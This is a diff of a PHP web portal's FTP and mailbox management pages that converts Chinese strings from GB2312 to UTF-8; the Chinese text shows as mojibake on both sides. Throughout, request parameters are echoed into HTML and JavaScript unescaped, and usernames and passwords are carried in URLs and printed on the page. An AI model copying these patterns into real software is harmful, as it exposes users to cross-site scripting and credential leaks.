  document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.ftp.submit();
 }
 
 function rename(oldName)
 {
-toname=prompt('½«ÎÄ¼ş '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†æ–‡ä»¶ '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
 
 function renamed(oldName)
 {
-toname=prompt('½«Ä¿Â¼ '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†ç›®å½• '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
@@ -5747,7 +7375,7 @@ function encodeuri(str){
         newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
         newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
         newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
-        // js replace µÄÄ£Ê½ÎŞÒıºÅ£¨Ë«µ¥£©£¬ÌØÊâ×Ö·ûĞè¼ÓĞ±¸Ü£¬¿ÉÒÔµ¥¶ÀÌæ»»Ä³¸ö×Ö·û¡£
+        // js replace çš„æ¨¡å¼æ— å¼•å·ï¼ˆåŒå•ï¼‰ï¼Œç‰¹æ®Šå­—ç¬¦éœ€åŠ æ–œæ ï¼Œå¯ä»¥å•ç‹¬æ›¿æ¢æŸä¸ªå­—ç¬¦ã€‚
         return(newstr);
 }
 </script>       
@@ -5771,7 +7399,7 @@ function encodeuri(str){
                 //echo $endid;          
                 ?>
         <tr class="tdtbg">
-                <td align="left">&nbsp;ÓÊÏä¹ÜÀí -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"¸ùÄ¿Â¼":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
+                <td align="left">&nbsp;é‚®ç®±ç®¡ç† -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"æ ¹ç›®å½•":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
         </tr>
 </table>
                 <?php 
@@ -5785,15 +7413,15 @@ function encodeuri(str){
                 ?>
                         <tr class="tdbg">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center">±êÌâ</td>
-                                <td align="center" width="25%">·¢¼şÈË</td>
-                                <td align="center" width="30%">ËÑË÷ ´´½¨ É¾³ı</td>
+                                <td align="center">æ ‡é¢˜</td>
+                                <td align="center" width="25%">å‘ä»¶äºº</td>
+                                <td align="center" width="30%">æœç´¢ åˆ›å»º åˆ é™¤</td>
                         </tr>
                 <?php 
                 $i = 0;
                 for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                         if ($debug == 1){
-                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '¶«ÑÇÒøĞĞÏµÍ³Éı¼¶¹«¸æ'));
+                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => 'ä¸œäºšé“¶è¡Œç³»ç»Ÿå‡çº§å…¬å‘Š'));
                                 $mailsubject = "";
                                 for($j=0;$j<count($mail_subject);$j++){
                                         if($j!=count($mail_subject)-1){
@@ -5805,7 +7433,7 @@ function encodeuri(str){
                                 }
                         }
                         else{
-                                $list = imap_headerinfo($mbox,$i,1024,1024);//·¢¼şÈË×Ö·û³¤¶È£¬Ö÷Ìâ×Ö·û³¤¶È
+                                $list = imap_headerinfo($mbox,$i,1024,1024);//å‘ä»¶äººå­—ç¬¦é•¿åº¦ï¼Œä¸»é¢˜å­—ç¬¦é•¿åº¦
                                 $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                 //print_r($mail_subject);
                                 //return;
@@ -5826,7 +7454,7 @@ function encodeuri(str){
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                 <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                 <td align="center"><?php echo $mailfrom;?></td>
-                                <td align="center">ËÑË÷ Ìí¼Ó É¾³ı Åä¶î ¸üÃû</td>
+                                <td align="center">æœç´¢ æ·»åŠ  åˆ é™¤ é…é¢ æ›´å</td>
                         </tr>
                         <?php 
                 }
@@ -5842,13 +7470,13 @@ function encodeuri(str){
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ä¸‹ä¸€é¡µ</a> ";
 
                 $gotopage = New PageChange();
                 $gotopage->CallPageChange();
@@ -5857,7 +7485,7 @@ function encodeuri(str){
         </tr>   
 </table>
 <?php 
-                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
         case "robot.modify":
                 break;
@@ -5884,16 +7512,16 @@ function changeimg()
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=imap&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
-                        &nbspÓòÃû£º<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
-                        &nbsp¶Ë¿Ú£º<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        &nbspåŸŸåï¼š<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        &nbspç«¯å£ï¼š<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                         <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                 <OPTION VALUE="imap">IMAP</OPTION>
                                 <OPTION VALUE="pop3">POP3</OPTION>
                                 <OPTION VALUE="nntp">NNTP</OPTION>
                         </SELECT>
-                        &nbspÑéÖ¤Âë£º<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspéªŒè¯ç ï¼š<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -5924,7 +7552,7 @@ if (trim(request('action')) == "ftp.download"){
         return;
         exit;
 }
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 IF(is_wap()){
 ?>
 <!DOCTYPE html 
@@ -5940,7 +7568,7 @@ $style = new css();
 $style->ico();
 $style->title("X3193 - FTP");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -5954,9 +7582,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -5970,7 +7598,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -5996,21 +7624,21 @@ switch (trim(request('action'))) {  // case start
         case "ftp.list":
                 if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                         if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
-                                AlertBack("·şÎñÆ÷Ãû¡¢ÓÃ»§Ãû»òÃÜÂëÎª¿Õ£¡" , 1);
+                                AlertBack("æœåŠ¡å™¨åã€ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }
                         else{
-                                AlertBack("·şÎñÆ÷Ãû¡¢ÓÃ»§Ãû»òÃÜÂëÎª¿Õ£¡" , 2);
+                                AlertBack("æœåŠ¡å™¨åã€ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼" , 2);
                                 break;
                         }
                 }
                 If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                         if (trim(request("checkcode")) != ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                 break;
                         }       
                         elseif (trim(request("checkcode")) == ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }               
                 }
@@ -6068,7 +7696,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 }       
                 $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                 if ((!$conn_id) || (!$login_result)) {
-                    AlertBack("FTPµÇÂ½Ê§°Ü£¡" , 2);
+                    AlertBack("FTPç™»é™†å¤±è´¥ï¼" , 2);
                 }
                 if (trim(request("pasv")) == "1"){
                         ftp_pasv ($conn_id, 1);
@@ -6088,21 +7716,21 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÎÄ¼şÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?')) return;
  document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.ftp.submit();
 }
 
 function rename(oldName)
 {
-toname=prompt('½«ÎÄ¼ş '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†æ–‡ä»¶ '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
 
 function renamed(oldName)
 {
-toname=prompt('½«Ä¿Â¼ '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†ç›®å½• '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
@@ -6113,19 +7741,19 @@ function encodeuri(str){
         newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
         newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
         newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
-        // js replace µÄÄ£Ê½ÎŞÒıºÅ£¨Ë«µ¥£©£¬ÌØÊâ×Ö·ûĞè¼ÓĞ±¸Ü£¬¿ÉÒÔµ¥¶ÀÌæ»»Ä³¸ö×Ö·û¡£
+        // js replace çš„æ¨¡å¼æ— å¼•å·ï¼ˆåŒå•ï¼‰ï¼Œç‰¹æ®Šå­—ç¬¦éœ€åŠ æ–œæ ï¼Œå¯ä»¥å•ç‹¬æ›¿æ¢æŸä¸ªå­—ç¬¦ã€‚
         return(newstr);
 }
 </script>       
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
 <form name="ftp" method="post" action="">
         <tr class="tdtbg">
-                <td align="center">FTP ¿Õ ¼ä ¹Ü Àí</td>
+                <td align="center">FTP ç©º é—´ ç®¡ ç†</td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left">&nbsp;FTP¹ÜÀí -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
+                <td align="left">&nbsp;FTPç®¡ç† -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
         </tr>
 </table>
                 <?php 
@@ -6141,10 +7769,10 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center" width="7%">ÀàĞÍ</td>
-                                <td align="center">Ãû³Æ</td>
-                                <td align="center" width="15%">ĞŞ¸ÄÊ±¼ä</td>
-                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">ĞÂ½¨</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">ÉÏ´«</a> <a style="color:#444444" href="javascript:delitem();">É¾³ı</a> Ñ¹Ëõ ½âÑ¹</td>
+                                <td align="center" width="7%">ç±»å‹</td>
+                                <td align="center">åç§°</td>
+                                <td align="center" width="15%">ä¿®æ”¹æ—¶é—´</td>
+                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">æ–°å»º</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">ä¸Šä¼ </a> <a style="color:#444444" href="javascript:delitem();">åˆ é™¤</a> å‹ç¼© è§£å‹</td>
                         </tr>
                         <?php 
                         $cMaxDir = 0;
@@ -6156,7 +7784,7 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg">
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>" /></td>
-                                <td align="center">Ä¿Â¼</td>
+                                <td align="center">ç›®å½•</td>
                                 <?php 
                                 if ($split[8] == "."){
                                 ?>
@@ -6175,7 +7803,7 @@ function encodeuri(str){
                                 }
                                 ?>
                                 <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
-                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">¸ÄÃû</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">É¾³ı</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.view")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">ÁĞ±í</a> Ñ¹Ëõ</td>
+                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">æ”¹å</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">åˆ é™¤</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.view")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">åˆ—è¡¨</a> å‹ç¼©</td>
                         </tr>
                         <?php 
                                         $cMaxDir = $cMaxDir + 1;
@@ -6190,10 +7818,10 @@ function encodeuri(str){
                         ?>
                         <tr class="tdbg">
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
-                                <td align="center">ÎÄ¼ş</td>
+                                <td align="center">æ–‡ä»¶</td>
